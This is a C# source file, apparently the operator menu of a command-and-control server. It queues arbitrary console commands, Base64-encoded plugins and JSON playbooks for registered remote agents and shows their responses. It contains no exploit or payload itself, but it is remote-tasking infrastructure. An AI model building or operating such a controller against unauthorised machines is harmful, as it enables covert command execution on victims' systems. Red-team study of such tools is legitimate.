using Spectre.Console;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
__________                   __               __       _____                       
\______   \_______  ____    |__| ____   _____/  |_    /     \ _____ _______  ______
 |     ___/\_  __ \/  _ \   |  |/ __ \_/ ___\   __\  /  \ /  \\__  \\_  __ \/  ___/
 |    |     |  | \(  <_> )  |  \  ___/\  \___|  |   /    Y    \/ __ \|  | \/\___ \ 
 |____|     |__|   \____/\__|  |\___  >\___  >__|   \____|__  (____  /__|  /____  >
                        \______|    \/     \/               \/     \/           \/
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*

            //the following are modified from Spectre Console docs
            // https://spectreconsole.net/widgets/table
            // https://spectreconsole.net/prompts/selection
            // Create a table
            var menuOptions = new Table();

            // Add some columns
            menuOptions.AddColumn("#");
            menuOptions.AddColumn(new TableColumn("Command"));
            string[] options = null;
            // Add some rows
            if (ListClients().Length == 0){
                menuOptions.AddRow("", "No Clients Registered. Some options are not shown");
                menuOptions.AddRow("1","[red]Exit[/]");
                menuOptions.AddRow("2","[blue]List all Clients[/]");
                options = new[] {"Exit", "List Clients"};
            } else {
                // Add some rows
                menuOptions.AddRow("1","[red]Exit[/]");
                menuOptions.AddRow("2","[blue]List all Clients[/]");
                menuOptions.AddRow("3", "[fuchsia]List Available Plugins[/]");
                menuOptions.AddRow("4","[green]Command[/]");
                menuOptions.AddRow("5","[purple]View Responses[/]");
                options = new[] {"Exit", "List Clients", "List Available Plugins", "Command", "View Responses"};
            }

            // Render the tables to the console
            AnsiConsole.Write(menuOptions);
            // added a prompt for the menu
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("What would you like to do?")
                    .PageSize(10)
                    .AddChoices(options));
            return prompt;
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                string input = Menu();
                // only list all options if there are registered clients
                if (ListClients().Length != 0){
                    switch(input){
                        case "Exit":
                            //exiting our loop here will terminate the server
                            menuLoop = false;
                            break;
                        case "List Clients":
                            var clients = new Table();
                            clients.AddColumn("Registered Clients");
                            foreach(var agent in ListClients()){
                                clients.AddRow(agent);
                            }
                            AnsiConsole.Write(clients);
                            break;
                        case "Command":
                            SetCommand();
                            break;
                        case "View Responses":
                            var comT = new Table();
                            ViewResponses();
                            break;
                        case "List Available Plugins":
                            var plugins = new Table();
                            if (ListPlugins().Length != 0) {
                                plugins.AddColumn("Installed Plugins");
                                foreach(var plugin in ListPlugins()){
                                    plugins.AddRow(plugin);
                                }
                            } else {
                                plugins.AddColumn("No plugins installed! Compile and place plugins in the listener's plugin folder!");
                            }
                            AnsiConsole.Write(plugins);
                            break;
                        default: 
                            Console.WriteLine("\nInvalid input; Please try again.");
                            break;
                    }
                } else {
                    switch(input){
                        case "Exit":
                            //exiting our loop here will terminate the server
                            menuLoop = false;
                            break;
                        case "List Clients":
                            var clients = new Table();
                            clients.AddColumn("Registered Clients");
                            foreach(var agent in ListClients()){
                                clients.AddRow(agent);
                            }
                            AnsiConsole.Write(clients);
                            break;
                        default: 
                            Console.WriteLine("\nInvalid input; Please try again.");
                            break;
                    }
                }
            }
        }
        public int SetCommand(){
            //take the user through adding commands to registered clients
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you would like to send a command to")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );

            //prevent user from running plugins or playbooks if they dont exist
            string[] options = null;
            if (ListPlugins().Length == 0){
                options = new[] {"Console Command"};
            } else if (ListPlaybooks().Length == 0){
                options = new[] {"Console Command", "Plugin"};
            } else {
                options = new[] {"Console Command", "Plugin", "Playbook"};
            }

            //set a command for a client to query
            var firstprompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Would you like to run a console command, one plugin, or a playbook?")
                    .PageSize(10)
                    .AddChoices(options)
            );

            switch (firstprompt){
                case "Console Command":
                    return ConsoleCommand(prompt);
                    break;
                case "Plugin":
                    return PluginCommand(prompt);
                    break;
                case "Playbook":
                    return PlaybookCommand(prompt);
                    break;
                default:
                    return 1;
                    break;
            }
        }

        private int ConsoleCommand(string prompt){
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                var command = AnsiConsole.Ask<string>("Enter the console [red]command to run:[/] ");
                string[] c_command = {command, "console"};
                agent.commandQue.AddLast(c_command);
                Console.WriteLine("\n");
                return 0;
            }
            //error if agent is not found for one reason or another
            return 1;
        }

        private int PluginCommand(string prompt){
            string thirdprompt = "";
            string fourthprompt = "";
            string[] input = null;
            if (ListPlugins().Length != 0){
                thirdprompt = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("Select the plugin to run:")
                        .PageSize(10)
                        .AddChoices(ListPlugins())
                );
                //save selected plugin to a variable
                var plugin = this.listener.pluginDict[thirdprompt];
                //get input depending on how many methods the plugins need
                //int ccount = Int32.Parse(plugin.Commands[0].ToString());
                int ccount = plugin.Methods.Count;
                if(ccount > 0){
                    fourthprompt = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                            .Title("Select the plugin method to run:")
                            .PageSize(10)
                            .AddChoices(ListPluginMethods(thirdprompt))
                    );

                    var method = plugin.Methods[fourthprompt];

                    if(method.arguements > 0){
                        input = new string[method.arguements];
                        var commandmsg = new Table();
                        commandmsg.AddColumn($"This plugin requires {method.arguements} input(s).");
                        AnsiConsole.Write(commandmsg);

                        for(int x = 0; x < method.arguements; x++){
                            input[x] = AnsiConsole.Ask<string>($"Enter plugin [red]input[/] [blue]{x+1}:[/]");
                        }
                    } else {
                        input = new string[1];
                        input[0] = "";
                    }

                    /*
                    //handle optional inputs
                    string newprompt = "";
                    if (plugin.Commands.Last() == '?'){
                        newprompt = AnsiConsole.Prompt(
                            new SelectionPrompt<string>()
                                .Title("This plugin has optional input. Provide it?")
                                .PageSize(10)
                                .AddChoices(new[] {"Yes", "No"})
                        );
                    } else {
                        newprompt = "Yes";
                    }
                    if (newprompt == "Yes"){
                        var commandmsg = new Table();
                        commandmsg.AddColumn($"This plugin requires {plugin.Commands} input(s).");
                        AnsiConsole.Write(commandmsg);

                        for(int x = 0; x < ccount; x++){
                            input[x] = AnsiConsole.Ask<string>($"Enter plugin [red]input[/] [blue]{x+1}:[/]");
                        }
                    } else {
                        input[0] = "";
                    }
                    */
                }
                //send to the agent
                if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                    //add plugin to command que
                    agent.commandQue.AddLast(new dynamic[]{this.listener.Base64EncodeFile(plugin.Path), "plugin", fourthprompt, input});
                    Console.WriteLine("\n");
                    return 0;
                } else {
                    return 1;
                }
            } else {
                return 1;
            }
        }

        private int PlaybookCommand(string prompt){
           string thirdprompt = "";
            if (ListPlaybooks().Length != 0){
                thirdprompt = AnsiConsole.Prompt(
                    new SelectionPrompt<string>()
                        .Title("Select the playbook to run:")
                        .PageSize(10)
                        .AddChoices(ListPlaybooks())
                );
                if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                    //que up the playbook plugins to run on the specific agent
                    var pb = new Playbook(thirdprompt);
                    //add each plugin in the playbook to the que
                    foreach (Playbook.playbookCommand p in pb.playbookQue){
                        if (p.type == "plugin"){
                            //add a plugin if it is a plugin
                            string method = p.command.Value[0];

                            List<dynamic> templist = new List<dynamic>(p.command.Value); 
                            templist.RemoveAt(0);
                            dynamic restofthepie = templist.ToArray();

                            agent.commandQue.AddLast(new dynamic[]{this.listener.Base64EncodeFile(this.listener.pluginDict[p.command.Key].Path), p.type, method, restofthepie});
                        } else if (p.type == "command"){
                            //add a command if it is a command
                            string[] c_command = {p.command.Key, "console"};
                            agent.commandQue.AddLast(c_command);
                        }
                    }
                    Console.WriteLine("\n");
                    return 0;
                } else {
                    return 1;
                }
            }
            return 0;
        }

        private string[] ListPlaybooks(){
            //shows available playbooks in the playbook folder
            return Directory.GetFiles($"{this.listener.playbookPath}", "*.json");
        }

        private string[] ListClients(){
            //Converts client list to a string array
            var agents = this.listener.agents;
            string[] agentArr = new string[agents.Count];
            int count = 0;
            foreach (var agent in agents){
                agentArr[count] = agent.Key;
                count++;
            }
            return agentArr;
        }

        private string[] ListPlugins(){
            //shows all plugins in the plugin dictionary
            var plugins = this.listener.pluginDict;
            string[] pluginArr = new string[plugins.Count];
            int count = 0;
            foreach(var plugin in plugins){
                pluginArr[count] = plugin.Key;
                count++;
            }
            return pluginArr;
        }

        private string[] ListPluginMethods(string _plugin){
            //shows all methods in the plugin dictionary
            var methodsDict = this.listener.pluginDict[_plugin].Methods;
            string[] pluginArr = new string[methodsDict.Count];
            int count = 0;
            foreach(var methods in methodsDict){
                pluginArr[count] = methods.Key;
                count++;
            }
            return pluginArr;
        }

        public void ViewResponses(){
            //return responses sent by each client
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you'd like to see responses from")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                AnsiConsole.Markup($"Responses from [red]{agent.name}[/]:\n");
                foreach(var com in agent.commandResp){
                    Console.WriteLine(com);
                }
                Console.WriteLine("\n");
            }
            //optionally clear the responses as this can get cluttered now that it is persistent
            var prompt2 = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title($"Would you like to [red]clear[/] the responses of [blue]{agent.name}[/]?")
                    .PageSize(10)
                    .AddChoices(new[]{"No", "Yes"})
            );
            if (prompt2 == "Yes"){
                ClearResponses(agent);
            }
        }

        private void ClearResponses(Agent agent){
            //takes an agent and clears the responce dictionary
            this.listener.LogServer($"Clearing responses of {agent.name}");
            agent.commandResp = new List<string>();
        }
    }
}